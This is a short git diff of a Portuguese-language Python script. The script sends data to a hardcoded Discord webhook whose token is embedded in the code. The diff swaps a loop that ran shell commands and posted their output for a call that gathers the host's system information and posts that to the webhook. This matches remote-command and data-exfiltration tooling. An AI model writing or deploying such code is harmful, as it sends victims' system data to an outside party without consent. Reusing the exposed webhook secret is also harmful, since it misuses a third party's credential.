@@ -1,5 +1,6 @@
 import subprocess
 import requests
+from plugins.systeminfo import obter_informacoes_sistema  
 
 DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284222512514727937/A08myURhvEgEJ2_76NX_gQa3vVr2ZG1VBiShR9_xRepZlpu-JxSQUe84vgWUzSxf9A3i'
 
@@ -19,11 +20,6 @@ def enviar_para_discord(mensagem):
         print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")
 
 if __name__ == "__main__":
-    comandos = [
-        'echo Hello, World!',
-        'dir'     
-    ]
+    informacoes_sistema = obter_informacoes_sistema()
 
-    for comando in comandos:
-        resultado = executar_comando(comando)
-        enviar_para_discord(f"Comando: {comando}\nResultado:\n{resultado}")
+    enviar_para_discord(f"Informações do Sistema:\n{informacoes_sistema}")
